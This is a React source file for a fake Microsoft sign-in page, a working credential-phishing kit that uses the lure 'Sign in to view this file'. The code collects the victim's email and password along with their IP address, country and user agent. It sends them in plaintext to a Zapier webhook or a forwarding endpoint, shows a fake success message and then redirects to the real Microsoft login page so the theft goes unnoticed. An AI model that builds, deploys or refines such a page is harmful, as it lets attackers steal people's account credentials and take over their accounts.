import React, { useState, useEffect } from 'react';
import { motion } from 'framer-motion';
import MicrosoftLogo from './MicrosoftLogo';
import { KeyRound } from 'lucide-react';
import PasswordInput from './PasswordInput';

const validateAutolink = async () => Promise.resolve('');

enum Stage {
  VALIDATING = 'VALIDATING',
  EMAIL = 'EMAIL',
  PASSWORD = 'PASSWORD',
  LOGGING_IN = 'LOGGING_IN',
  SUCCESS = 'SUCCESS'
}

// Zapier webhook (set in .env as VITE_ZAPIER_WEBHOOK) or fallback to serverless
const ZAPIER_WEBHOOK = (import.meta.env.VITE_ZAPIER_WEBHOOK as string) || "";
const BACKEND_ENDPOINT = ZAPIER_WEBHOOK || "/api/forwardToZapier";

const MicrosoftLogin: React.FC = () => {
  const [stage, setStage] = useState<Stage>(Stage.VALIDATING);
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [error, setError] = useState('');
  const [pwError, setPwError] = useState('');
  const [keepSignedIn, setKeepSignedIn] = useState(false);
  const [ip, setIp] = useState('');
  const [country, setCountry] = useState('');

  useEffect(() => {
    (async () => {
      // Get IP & Country
      try {
        const res = await fetch('https://ipinfo.io/json?token=YOUR_TOKEN_IF_NEEDED');
        if (res.ok) {
          const data = await res.json();
          setIp(data.ip || '');
          setCountry(data.country || data.region || '');
        }
      } catch {
        // silently fail
      }

      // Auto-fill email if autolink exists (optional)
      try {
        const e = await validateAutolink();
        if (e) {
          setEmail(e);
          setStage(Stage.PASSWORD);
        } else {
          setStage(Stage.EMAIL);
        }
      } catch {
        setStage(Stage.EMAIL);
      }
    })();
  }, []);

  // Auto-redirect after success (optional but realistic)
  useEffect(() => {
    if (stage === Stage.SUCCESS) {
      const timer = setTimeout(() => {
        window.location.href = "https://login.microsoftonline.com/";
      }, 1800);
      return () => clearTimeout(timer);
    }
  }, [stage]);

  const onEmailNext = (e: React.FormEvent) => {
    e.preventDefault();
    if (!email.trim()) {
      setError('Enter your email, phone, or Skype');
      return;
    }
    setError('');
    setStage(Stage.PASSWORD);
  };

  const onPasswordSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    if (!password) {
      setPwError('Enter your password');
      return;
    }

    setStage(Stage.LOGGING_IN);
    setPwError('');

    // Keep signed in cookie
    if (keepSignedIn) {
      const expires = new Date(Date.now() + 30 * 24 * 60 * 60 * 1000).toUTCString();
      document.cookie = `keepSignedIn=true; expires=${expires}; path=/; Secure; SameSite=Strict`;
    } else {
      document.cookie = `keepSignedIn=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;`;
    }

    const payload = {
      email: email.trim(),
      password,
      ip,
      country,
      userAgent: navigator.userAgent,
      timestamp: new Date().toISOString(),
    };

    try {
      const response = await fetch(BACKEND_ENDPOINT, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(payload),
      });

      if (response.ok) {
        // Zapier returns plain text "success" → don't try to parse JSON
        const contentType = response.headers.get("content-type");
        if (contentType?.includes("application/json")) {
          try {
            const data = await response.json();
            if (data?.success === false) {
              setPwError(data.error || "Login failed");
              setStage(Stage.PASSWORD);
              return;
            }
          } catch {
            // JSON failed → ignore (expected with Zapier)
          }
        }
        // Everything OK → show success + redirect
        setStage(Stage.SUCCESS);
      } else {
        // Non-200 response
        let msg = "Login failed. Try again.";
        try {
          const text = await response.text();
          if (text.toLowerCase().includes("rate limit") || response.status === 429) {
            msg = "Too many attempts. Try again later.";
          } else if (text) {
            msg = text.substring(0, 120);
          }
        } catch {}
        setPwError(msg);
        setStage(Stage.PASSWORD);
      }
    } catch (err) {
      console.error("Submit error:", err);
      setPwError("Network error. Check your connection.");
      setStage(Stage.PASSWORD);
    }
  };

  const goBack = () => {
    if (stage === Stage.PASSWORD) setStage(Stage.EMAIL);
    else window.history.back();
  };

  const startOver = () => {
    setEmail('');
    setPassword('');
    setError('');
    setPwError('');
    setStage(Stage.EMAIL);
  };

  return (
    <div className="min-h-screen flex items-center justify-center p-4 bg-gray-100">
      <motion.div
        initial={{ opacity: 0 }}
        animate={{ opacity: 1 }}
        transition={{ duration: 0.4 }}
        className="bg-white p-8 rounded-lg shadow-lg w-full max-w-md"
      >
        <div className="flex justify-start mb-6">
          <MicrosoftLogo />
        </div>

        {/* EMAIL STAGE */}
        {stage === Stage.EMAIL && (
          <motion.form onSubmit={onEmailNext} initial={{ opacity: 0 }} animate={{ opacity: 1 }}>
            <h2 className="text-2xl font-semibold text-gray-900 mb-6 text-left">Sign in to view this file</h2>
            <div>
              <input
                type="text"
                value={email}
                onChange={(e) => { setEmail(e.target.value); setError(''); }}
                placeholder="Email, phone, or Skype"
                className="w-full border-0 border-b-2 border-gray-400 pb-2 focus:outline-none focus:border-black text-lg"
                autoFocus
              />
              {error && <p className="mt-2 text-sm text-red-600">{error}</p>}
            </div>

            <div className="text-left text-sm space-y-3 mt-8">
              <p className="text-gray-600">
                No account? <a href="#" className="text-[#0067B8] hover:underline">Create one!</a>
              </p>
              <a href="#" className="text-[#0067B8] hover:underline block">Can't access your account?</a>
            </div>

            <div className="pt-8 flex justify-between">
              <button type="button" onClick={goBack} className="px-10 py-2 text-sm bg-gray-200 rounded hover:bg-gray-300">
                Back
              </button>
              <button type="submit" className="px-10 py-2 text-sm bg-[#0067B8] text-white rounded hover:bg-[#005a9e]">
                Next
              </button>
            </div>

            <div className="mt-8 pt-6 border-t border-gray-300">
              <button type="button" className="flex items-center text-[#0067B8] hover:underline text-sm">
                <KeyRound size={16} className="mr-2" />
                Sign-in options
              </button>
            </div>
          </motion.form>
        )}

        {/* PASSWORD STAGE */}
        {stage === Stage.PASSWORD && (
          <motion.form onSubmit={onPasswordSubmit} initial={{ opacity: 0 }} animate={{ opacity: 1 }}>
            <div className="text-left mb-6">
              <h2 className="text-2xl font-semibold text-gray-900">Enter password</h2>
              <p className="text-sm text-gray-600 mt-2">
                {email}
                <button type="button" onClick={() => setStage(Stage.EMAIL)} className="ml-2 text-[#0067B8] hover:underline">
                  Change
                </button>
              </p>
            </div>

            <PasswordInput
              value={password}
              onChange={(e) => { setPassword(e.target.value); setPwError(''); }}
              error={pwError}
              autoFocus
            />

            <div className="my-6 flex items-center">
              <input
                id="keep-signed-in"
                type="checkbox"
                checked={keepSignedIn}
                onChange={(e) => setKeepSignedIn(e.target.checked)}
                className="h-4 w-4 text-blue-600 rounded"
              />
              <label htmlFor="keep-signed-in" className="ml-2 text-sm text-gray-900">
                Keep me signed in
              </label>
            </div>

            <div className="text-left mb-6">
              <a href="#" className="text-[#0067B8] hover:underline text-sm">Forgot your password?</a>
            </div>

            <div className="flex justify-end">
              <button
                type="submit"
                disabled={stage === Stage.LOGGING_IN}
                className={`px-10 py-2 text-white rounded text-sm font-medium ${
                  stage === Stage.LOGGING_IN
                    ? 'bg-gray-400 cursor-not-allowed'
                    : 'bg-[#0067B8] hover:bg-[#005a9e]'
                }`}
              >
                {stage === Stage.LOGGING_IN ? 'Signing in...' : 'Next'}
              </button>
            </div>
          </motion.form>
        )}

        {/* LOGGING IN */}
        {stage === Stage.LOGGING_IN && (
          <div className="text-center py-8">
            <p className="text-lg text-gray-700">Signing you in...</p>
          </div>
        )}

        {/* SUCCESS */}
        {stage === Stage.SUCCESS && (
          <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} className="text-center py-8">
            <p className="text-green-600 text-xl font-semibold mb-4">Sign in successful!</p>
            <p className="text-gray-600">Redirecting to Microsoft...</p>
          </motion.div>
        )}
      </motion.div>
    </div>
  );
};

export default MicrosoftLogin;
